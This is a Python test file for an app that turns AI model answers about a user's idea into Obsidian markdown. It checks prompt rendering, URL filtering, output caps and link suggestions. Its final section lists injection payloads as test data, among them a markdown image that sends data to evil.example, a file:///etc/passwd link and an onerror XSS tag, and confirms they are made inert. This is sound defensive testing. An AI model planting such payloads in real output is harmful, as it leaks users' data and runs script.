"""What each action asks, and what of the answer is kept.

The model answers JSON; the app writes the markdown. Nothing the model
says reaches the note without passing through here.
"""

import json
from pathlib import Path

import pytest

from oknowledge import idea_actions as acts
from oknowledge.ai.base import AnalysisError
from oknowledge.config import Config
from oknowledge.ideas import new_idea
from oknowledge.model import Note

INSTANT = "2026-10-12T21:04:05.123456+00:00"


def idea(text="Una app que arme la rutina del gimnasio.", title="Gym con IA", **fields):
    note = new_idea(text, title, "2026-10-12", INSTANT)
    note.tags, note.summary = ["gimnasio"], "Rutinas solas."
    for key, value in fields.items():
        setattr(note, key, value)
    return note


def link(n, title, category="Salud", summary="", tags=()):
    return (Path(f"/v/links/2026-10-0{n}-{title.lower().replace(' ', '-')}.md"),
            Note(id=f"{n:012d}", url=f"https://e.com/{n}", title=title, category=category,
                 tags=list(tags), type="article", source="e.com", saved=f"2026-10-0{n}",
                 summary=summary))


# --- prompts ------------------------------------------------------------------

@pytest.mark.parametrize("action", ["exists", "improve", "expand", "links"])
def test_every_prompt_carries_the_idea(action):
    prompt = acts.render_action_prompt(action, idea(), "es", candidates="c1")
    assert "Una app que arme la rutina del gimnasio." in prompt
    assert "Gym con IA" in prompt and "gimnasio" in prompt and "Rutinas solas." in prompt
    assert "español" in prompt
    assert "{{" not in prompt


def test_a_text_that_looks_like_a_placeholder_is_not_substituted():
    prompt = acts.render_action_prompt("improve", idea(text="{{TITLE}} literal"), "es")
    assert "{{TITLE}} literal" in prompt


def test_the_links_prompt_lists_the_candidates():
    assert "id1 | WireGuard" in acts.render_action_prompt("links", idea(), "es",
                                                          candidates="id1 | WireGuard")


# --- already out there --------------------------------------------------------

def found(**data):
    return acts.exists_found(data)


def test_the_verdict_matches_and_difference_are_written():
    text = acts.exists_section(found(
        verdict="similar",
        matches=[{"name": "Linkwise", "url": "https://linkwise.app/", "note": "resume links"}],
        difference="La tuya arma rutinas."), "es", "2026-10-12", "opencode/mimo")
    assert text.splitlines()[0] == "**Hay parecidas.** Buscado el 2026-10-12 con opencode/mimo."
    assert "- [Linkwise](https://linkwise.app/) — resume links" in text
    assert text.splitlines()[-1] == "**Lo tuyo:** La tuya arma rutinas."


def test_an_unknown_verdict_counts_as_similar():
    assert found(verdict="maybe", matches=[]).verdict == "similar"


def test_only_web_urls_survive():
    kept = found(verdict="exists", matches=[
        {"name": "a", "url": "javascript:alert(1)"}, {"name": "b", "url": "file:///etc"},
        {"name": "c", "url": "https://ok.com/x y"}, {"name": "d", "url": "https://ok.com/d"},
        {"name": "e)", "url": "https://ok.com/e)"}]).matches
    assert [m[0] for m in kept] == ["d"]


def test_at_most_eight_matches_and_placeholders_dropped():
    many = [{"name": f"n{i}", "url": f"https://e.com/{i}"} for i in range(12)]
    assert len(found(verdict="similar", matches=many).matches) == 8
    assert found(verdict="similar", matches=[{"name": "<nombre>", "url": "https://e.com"}]).matches == []


def test_new_with_nothing_says_so_in_english_too():
    text = acts.exists_section(found(verdict="new", matches=[]), "en", "2026-10-12", "m")
    assert text.startswith("**I found nothing like it.** Searched on 2026-10-12 with m.")


def test_an_answer_with_no_verdict_and_no_matches_is_no_use():
    with pytest.raises(AnalysisError):
        found(difference="x")


def test_a_bracket_in_a_name_cannot_break_the_link():
    text = acts.exists_section(found(verdict="exists", matches=[
        {"name": "a]b", "url": "https://e.com"}]), "es", "d", "m")
    assert "[a\\]b](https://e.com)" in text


# --- improve and expand -------------------------------------------------------

def test_improvements_are_weak_point_and_fix():
    assert acts.improve_section({"items": [{"weak": "Lento", "fix": "cachear"},
                                           {"fix": "solo el arreglo"}]}) == (
        "- **Lento** — cachear\n- solo el arreglo")


def test_improvements_are_capped_at_eight():
    items = [{"weak": f"w{i}", "fix": f"f{i}"} for i in range(11)]
    assert len(acts.improve_section({"items": items}).splitlines()) == 8


def test_expansion_is_a_list_capped_at_ten():
    assert acts.expand_section({"items": [f"idea {i}" for i in range(14)]}).count("\n- ") == 9


@pytest.mark.parametrize("data", [{}, {"items": []}, {"items": "x"}, {"items": [3, None]}])
def test_an_empty_or_malformed_list_is_no_use(data):
    with pytest.raises(AnalysisError):
        acts.improve_section(data)
    with pytest.raises(AnalysisError):
        acts.expand_section(data)


# --- links --------------------------------------------------------------------

def test_candidates_keep_the_category_drop_the_related_and_rank_by_shared_words():
    entries = [link(1, "Recetas", category="Cocina", summary="gimnasio rutina"),
               link(2, "Rutina de fuerza", summary="rutina gimnasio progresión"),
               link(3, "Dormir mejor", summary="sueño"),
               link(4, "Ya sumado", summary="rutina gimnasio")]
    note = idea(related=[entries[3][0].stem])
    chosen = acts.candidates(note, entries, "Salud")
    assert [n.title for _, n in chosen] == ["Rutina de fuerza", "Dormir mejor"]
    assert [n.title for _, n in acts.candidates(note, entries, "")][0] in (
        "Rutina de fuerza", "Recetas")


def test_candidates_are_capped_at_sixty():
    entries = [link(1, f"L{i}") for i in range(70)]
    assert len(acts.candidates(idea(), entries, "")) == 60


def test_a_candidate_line_is_id_title_category_and_a_short_summary():
    line = acts.candidate_lines([link(1, "WireGuard", category="Redes", summary="x" * 300)])
    assert line == "000000000001 | WireGuard | Redes | " + "x" * 200


def test_suggestions_keep_only_known_ids_with_their_file_name():
    allowed = {"000000000001": "2026-10-01-wireguard"}
    text = acts.links_section({"links": [{"id": "000000000001", "why": "es la vpn"},
                                         {"id": "inventado", "why": "x"},
                                         {"id": "000000000001", "why": "repetido"}]},
                              allowed, "Redes", "es")
    assert text == "*Entre: Redes.*\n\n- [[2026-10-01-wireguard]] — es la vpn"


def test_none_fitting_is_said_not_failed():
    assert acts.links_section({"links": []}, {}, "Redes", "es") == (
        "*Entre: Redes.*\n\nNinguno de estos links le sirve a la idea.")


def test_suggestions_are_capped_at_ten():
    allowed = {str(i): f"s{i}" for i in range(15)}
    text = acts.links_section({"links": [{"id": str(i), "why": ""} for i in range(15)]},
                              allowed, "Redes", "es")
    assert text.count("[[") == 10


def test_a_links_answer_without_links_is_no_use():
    with pytest.raises(AnalysisError):
        acts.links_section({"other": 1}, {}, "Redes", "es")


# --- compose ------------------------------------------------------------------

class Engine:
    model = "fake-1"

    def __init__(self, reply, searches=True):
        self.reply, self.searches, self.calls = reply, searches, []

    def complete(self, prompt):
        self.calls.append(("complete", prompt))
        return self.reply

    def search(self, prompt):
        self.calls.append(("search", prompt))
        return self.reply


@pytest.fixture
def cfg(tmp_path):
    vault = tmp_path / "vault"
    (vault / "oknowledge" / "links").mkdir(parents=True)
    return Config(vault=vault, chain=("fake",))


@pytest.fixture
def engine(monkeypatch):
    holder = Engine(json.dumps({"items": ["Modo offline"]}))
    monkeypatch.setattr("oknowledge.ai.build_engine", lambda name, cfg: holder)
    return holder


def test_exists_searches_and_signs_with_the_model(cfg, engine):
    engine.reply = json.dumps({"verdict": "new", "matches": []})
    text, used, model = acts.compose(cfg, idea(), "exists", "", "2026-10-12")
    assert engine.calls[0][0] == "search"
    assert "Buscado el 2026-10-12 con fake-1." in text
    assert (used, model) == ("fake", "fake-1")


def test_expand_thinks_without_searching(cfg, engine):
    text, _, _ = acts.compose(cfg, idea(), "expand", "", "2026-10-12")
    assert engine.calls[0][0] == "complete"
    assert text == "- Modo offline"


def test_links_with_no_candidates_asks_nobody(cfg, engine):
    text, used, model = acts.compose(cfg, idea(), "links", "Cocina", "2026-10-12")
    assert engine.calls == []
    assert text == "*Entre: Cocina.*\n\nNo hay links en Cocina que no estén ya relacionados."
    assert (used, model) == ("", "")


def test_links_offers_the_library_and_writes_the_file_name(cfg, engine):
    from oknowledge.vault import write_note
    path = write_note(cfg, link(1, "WireGuard", category="Redes")[1], "es")
    engine.reply = json.dumps({"links": [{"id": "000000000001", "why": "la vpn"}]})
    text, _, _ = acts.compose(cfg, idea(), "links", "", "2026-10-12")
    assert "000000000001 | WireGuard | Redes" in engine.calls[0][1]
    assert text == f"*Entre: tu biblioteca.*\n\n- [[{path.stem}]] — la vpn"


# --- final review: model text is text in Obsidian too ----------------------

ATTACKS = ["![](https://evil.example/?d=idea)", "!![x](https://evil.example)",
           "[mira](file:///etc/passwd)", "<img src=x onerror=alert(1)>",
           "[x](obsidian://open?vault=v)"]


@pytest.mark.parametrize("attack", ATTACKS)
def test_model_text_cannot_become_an_image_a_link_or_html(attack):
    def written(make):
        # Dropped altogether is as safe as made inert: `<...>` reads as the
        # prompt's own placeholder and never reaches the note.
        try:
            return make()
        except AnalysisError:
            return ""

    sections = [
        written(lambda: acts.exists_section(found(verdict="similar", difference=attack, matches=[
            {"name": "n", "url": "https://ok.com", "note": attack}]), "es", "d", "m")),
        written(lambda: acts.improve_section({"items": [{"weak": attack, "fix": attack}]})),
        written(lambda: acts.expand_section({"items": [attack]})),
        written(lambda: acts.links_section({"links": [{"id": "1", "why": attack}]},
                                           {"1": "s"}, "R", "es")),
    ]
    for text in sections:
        assert "![" not in text
        assert "](file:" not in text and "](obsidian:" not in text
        assert "](https://evil" not in text
        assert "<img" not in text
